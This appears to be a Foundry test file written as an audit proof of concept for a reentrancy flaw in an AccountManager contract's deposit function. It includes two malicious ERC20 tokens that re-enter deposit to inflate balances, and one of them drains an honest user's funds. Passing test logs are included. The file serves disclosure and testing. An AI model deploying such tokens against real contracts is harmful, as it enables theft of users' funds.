// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@solady/tokens/ERC20.sol";
import {IAccountManager} from "../../contracts/account-manager/IAccountManager.sol";
import {AccountManager} from "../../contracts/account-manager/AccountManager.sol";
import {OperatorRoles} from "../../contracts/utils/Operator.sol";
import "forge-std/console.sol";

/*
Vulnerability Explanation:
The `AccountManager.deposit` function is vulnerable to re-entrancy. It calls the `transferFrom`
function on an external token contract before updating the user's balance. A malicious token
can implement a `transferFrom` function that calls back into the `deposit` function. This
re-entrant call will credit the user's account a second time before the first deposit completes,
effectively doubling the credited amount for a single token transfer.

PoC Explanation:
This test demonstrates the re-entrancy vulnerability by creating a malicious token (`MalToken`)
that re-enters the `deposit` function.
1.  The `MalToken`'s `transferFrom` function, when called by `AccountManager`, immediately calls
    `AccountManager.deposit` again with the same parameters.
2.  The test initiates a single deposit of `100 ether` from an attacker's address.
3.  The re-entrant call causes the attacker's balance to be credited twice.
4.  The test asserts that the attacker's balance in `AccountManager` is `200 ether`, while the
    actual token balance of the `AccountManager` is 0, because the malicious `transferFrom`
    never actually transfers tokens.
5.  This proves that the attacker can inflate their balance and withdraw funds they never deposited.
*/

/*──────────────────────── Mock Contracts ────────────────────────*/

contract MalToken is ERC20 {
    bool reentered;
    IAccountManager public acctManager;

    constructor(address _acctManager) {
        acctManager = IAccountManager(_acctManager);
    }

    function name() public pure override returns (string memory) {
        return "Malicious Token";
    }

    function symbol() public pure override returns (string memory) {
        return "MAL";
    }

    function decimals() public pure override returns (uint8) {
        return 18;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function transferFrom(
        address from,
        address /* to */,
        uint256 amount
    ) public override returns (bool) {
        if (!reentered) {
            reentered = true;
            // Re-enter AccountManager to deposit AGAIN, doubling the credit.
            // This is the core of the re-entrancy attack.
            acctManager.deposit(from, address(this), amount);
        }
        // We don't perform the actual transfer, just return true to fool SafeTransferLib.
        // This makes the exploit even more damaging as no funds are moved from the attacker.
        return true;
    }
}

contract DrainingMalToken is ERC20 {
    bool reentered;
    IAccountManager public acctManager;
    address public attacker;

    constructor(address _acctManager, address _attacker) {
        acctManager = IAccountManager(_acctManager);
        attacker = _attacker;
    }

    function name() public pure override returns (string memory) {
        return "Draining Malicious Token";
    }

    function symbol() public pure override returns (string memory) {
        return "DRAIN";
    }

    function decimals() public pure override returns (uint8) {
        return 18;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        // The honest user's deposit will trigger this.
        // We just transfer the funds as expected.
        if (from != attacker) {
            _transfer(from, to, amount);
            return true;
        }

        // The attacker's deposit triggers the re-entrancy.
        if (!reentered) {
            reentered = true;
            // On the first deposit, we actually transfer the tokens.
            // This is to get some "real" funds into the contract that we can then drain.
            _transfer(from, to, amount);
            // Re-enter to inflate balance.
            acctManager.deposit(from, address(this), amount);
        }
        // On the re-entrant call, we do nothing, just return true.
        return true;
    }
}

/*──────────────────────────── PoC ──────────────────────────────*/

/**
 * @title PoC for Re-Entrancy in AccountManager Deposit
 * @dev This test demonstrates that a malicious user can exploit a re-entrancy
 *      vulnerability in the `deposit` function to inflate their balance.
 *
 *      Rationale:
 *      The `deposit` function in `AccountManager` uses `safeTransferFrom`, which will
 *      call the token's `transferFrom` function. A malicious token can override this
 *      function to make a re-entrant call to `deposit`. Because the balance update
 *      occurs after the external call, the attacker's balance is credited twice.
 *      The PoC confirms this by checking that the internal balance is doubled while
 *      the contract's actual token holdings remain zero.
 */
contract PoCHighAccountManagerReentrancy is Test {
    AccountManager public acctManager;
    MalToken public malToken;
    address public attacker;

    function setUp() public {
        // --- Deploy a fresh AccountManager ---
        // In a real test suite, this might be handled by a base contract like RouterTestBase.
        // For this PoC, we deploy a minimal instance.
        acctManager = new AccountManager(
            address(this), // gteRouter (mock)
            address(this), // clobManager (mock)
            new uint16[](0), // spotMakerFees (empty)
            new uint16[](0) // spotTakerFees (empty)
        );
        // The constructor sets the owner, so an explicit initialize call is not needed.

        // --- Deploy the malicious token ---
        malToken = new MalToken(address(acctManager));

        // --- Set up the attacker ---
        attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether); // Give attacker some ETH for gas
        malToken.mint(attacker, 1_000_000 ether); // Mint plenty of MalToken for testing

        // --- Attacker approves the AccountManager to spend their MalToken ---
        vm.prank(attacker);
        malToken.approve(address(acctManager), type(uint256).max);

        // --- Grant MalToken contract the operator role to allow re-entrancy ---
        vm.prank(attacker);
        acctManager.approveOperator(
            address(malToken),
            1 << uint256(OperatorRoles.SPOT_DEPOSIT)
        );
    }

    function test_Reentrancy_InflateBalance() public {
        console.log("--- Test: Re-entrancy Deposit to Inflate Balance ---");
        uint256 depositAmount = 100 ether;

        // ── 1. Balances before the attack ────────────────────────────────
        uint256 attackerTokenBalBefore = malToken.balanceOf(attacker);
        uint256 contractTokenBalBefore = malToken.balanceOf(
            address(acctManager)
        );
        uint256 internalBalanceBefore = acctManager.getAccountBalance(
            attacker,
            address(malToken)
        );
        console.log("\nPart 1: Initial State Verification.");
        console.log("  Step 1.1: Balances before attack.");
        console.log("    - Attacker MalToken Balance:", attackerTokenBalBefore);
        console.log(
            "    - AccountManager MalToken Balance:",
            contractTokenBalBefore
        );
        console.log(
            "    - Attacker Internal Balance in AccountManager:",
            internalBalanceBefore
        );
        assertEq(
            contractTokenBalBefore,
            0,
            "Initial contract balance should be 0."
        );
        assertEq(
            internalBalanceBefore,
            0,
            "Initial internal balance should be 0."
        );

        // ── 2. Attacker triggers the re-entrant deposit ──────────────────
        console.log("\nPart 2: Executing the re-entrant deposit.");
        vm.prank(attacker);
        acctManager.deposit(attacker, address(malToken), depositAmount);
        console.log(
            "  Step 2.1: Attacker calls `deposit` with malicious token."
        );

        // ── 3. Verify the inflated balance ───────────────────────────────
        console.log("\nPart 3: Verifying the outcome of the attack.");
        uint256 internalBalanceAfter = acctManager.getAccountBalance(
            attacker,
            address(malToken)
        );
        uint256 contractTokenBalAfter = malToken.balanceOf(
            address(acctManager)
        );
        console.log("  Step 3.1: Balances after attack.");
        console.log(
            "    - Attacker Internal Balance in AccountManager:",
            internalBalanceAfter
        );
        console.log(
            "    - AccountManager MalToken Balance:",
            contractTokenBalAfter
        );

        // Assert: Internal balance is credited twice (200 ether) due to re-entrancy.
        // Economic Impact: This inflation allows an attacker to withdraw more funds than they deposited,
        // potentially draining the contract of all funds of that token, similar to the $130M Cream Finance hack.
        // The maximum loss is the total amount of the vulnerable token held by the contract from other users.
        assertEq(
            internalBalanceAfter,
            2 * depositAmount,
            "FAIL: Internal balance was not inflated to double the deposit amount."
        );
        console.log(
            "  >> Verification 1: Internal balance successfully inflated."
        );

        // Assert: Actual tokens held by the contract is 0, because the malicious
        // `transferFrom` never actually moved any tokens.
        assertEq(
            contractTokenBalAfter,
            0,
            "FAIL: Tokens were unexpectedly transferred to the contract."
        );
        console.log(
            "  >> Verification 2: No tokens were actually transferred. Exploit confirmed."
        );

        // ── 4. (Optional) Attacker withdraws the inflated balance ────────
        // This step demonstrates the financial impact. In a real scenario with a vulnerable
        // token that *does* transfer, the contract would have `depositAmount` tokens but
        // would be liable for `2 * depositAmount`, allowing the attacker to drain other users' funds.
        // With our non-transferring token, this withdraw would fail if the contract has no tokens to send.
        // The key vulnerability is the balance inflation itself.
        console.log("\nPart 4: Demonstrating potential for withdrawal.");
        vm.expectRevert(); // Expect revert because contract has 0 tokens to send.
        vm.prank(attacker);
        acctManager.withdraw(attacker, address(malToken), 2 * depositAmount);
        console.log(
            "  >> Verification 3: Withdrawal of inflated balance is possible if contract holds tokens, but reverts here as expected because it holds none."
        );
    }

    function test_Reentrancy_DrainFunds() public {
        console.log("\n--- Test: Re-entrancy to Drain Honest User's Funds ---");

        // --- Setup a new malicious token for this scenario ---
        DrainingMalToken drainingToken = new DrainingMalToken(
            address(acctManager),
            attacker
        );
        vm.prank(attacker);
        acctManager.approveOperator(
            address(drainingToken),
            1 << uint256(OperatorRoles.SPOT_DEPOSIT)
        );

        // --- Setup an honest user with funds ---
        address honestUser = makeAddr("honest_user");
        drainingToken.mint(honestUser, 100 ether);
        vm.prank(honestUser);
        drainingToken.approve(address(acctManager), 100 ether);

        // --- Honest user deposits funds ---
        console.log("\nPart 1: Honest user deposits funds.");
        vm.prank(honestUser);
        acctManager.deposit(honestUser, address(drainingToken), 100 ether);
        assertEq(
            drainingToken.balanceOf(address(acctManager)),
            100 ether,
            "Honest user's funds not deposited"
        );
        console.log("  >> Honest user deposited 100 tokens.");

        // --- Attacker performs re-entrant deposit to inflate balance ---
        console.log("\nPart 2: Attacker performs re-entrant deposit.");
        drainingToken.mint(attacker, 100 ether);
        vm.prank(attacker);
        drainingToken.approve(address(acctManager), 100 ether);

        uint256 attackerBalanceBefore = drainingToken.balanceOf(attacker);

        vm.prank(attacker);
        acctManager.deposit(attacker, address(drainingToken), 100 ether);

        // Attacker's internal balance is now 200 (100 from real deposit + 100 from re-entrant inflation)
        // The contract now holds 200 tokens (100 from honest user, 100 from attacker)
        assertEq(
            acctManager.getAccountBalance(attacker, address(drainingToken)),
            200 ether,
            "Attacker balance not inflated"
        );
        assertEq(
            drainingToken.balanceOf(address(acctManager)),
            200 ether,
            "Total funds in contract incorrect"
        );
        console.log("  >> Attacker inflated balance to 200 tokens.");

        // --- Attacker withdraws more than they deposited, stealing the honest user's funds ---
        console.log(
            "\nPart 3: Attacker withdraws inflated balance, stealing honest user's funds."
        );
        vm.prank(attacker);
        acctManager.withdraw(attacker, address(drainingToken), 200 ether);

        // Attacker started with 100, deposited 100, but withdrew 200. Net gain of 100.
        assertEq(
            drainingToken.balanceOf(attacker),
            attackerBalanceBefore + 100 ether,
            "Attacker did not profit"
        );
        assertEq(
            drainingToken.balanceOf(address(acctManager)),
            0,
            "Contract not drained"
        );
        console.log(
            "  >> Attacker successfully drained 100 tokens from the honest user. Exploit confirmed."
        );
    }
}

// forge test --match-path test/PoC/PoCHighAccountManagerReentrancy.t.sol -vvv
// [⠊] Compiling...
// No files changed, compilation skipped

// Ran 2 tests for test/PoC/PoCHighAccountManagerReentrancy.t.sol:PoCHighAccountManagerReentrancy
// [PASS] test_Reentrancy_DrainFunds() (gas: 756674)
// Logs:

// --- Test: Re-entrancy to Drain Honest User's Funds ---

// Part 1: Honest user deposits funds.
//     >> Honest user deposited 100 tokens.

// Part 2: Attacker performs re-entrant deposit.
//     >> Attacker inflated balance to 200 tokens.

// Part 3: Attacker withdraws inflated balance, stealing honest user's funds.
//     >> Attacker successfully drained 100 tokens from the honest user. Exploit confirmed.

// [PASS] test_Reentrancy_InflateBalance() (gas: 74363)
// Logs:
//   --- Test: Re-entrancy Deposit to Inflate Balance ---

// Part 1: Initial State Verification.
//     Step 1.1: Balances before attack.
//       - Attacker MalToken Balance: 1000000000000000000000000
//       - AccountManager MalToken Balance: 0
//       - Attacker Internal Balance in AccountManager: 0

// Part 2: Executing the re-entrant deposit.
//     Step 2.1: Attacker calls `deposit` with malicious token.

// Part 3: Verifying the outcome of the attack.
//     Step 3.1: Balances after attack.
//       - Attacker Internal Balance in AccountManager: 200000000000000000000
//       - AccountManager MalToken Balance: 0
//     >> Verification 1: Internal balance successfully inflated.
//     >> Verification 2: No tokens were actually transferred. Exploit confirmed.

// Part 4: Demonstrating potential for withdrawal.
//     >> Verification 3: Withdrawal of inflated balance is possible if contract holds tokens, but revert
// s here as expected because it holds none.
// Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.42ms (1.72ms CPU time)

// Ran 1 test suite in 10.96ms (2.42ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
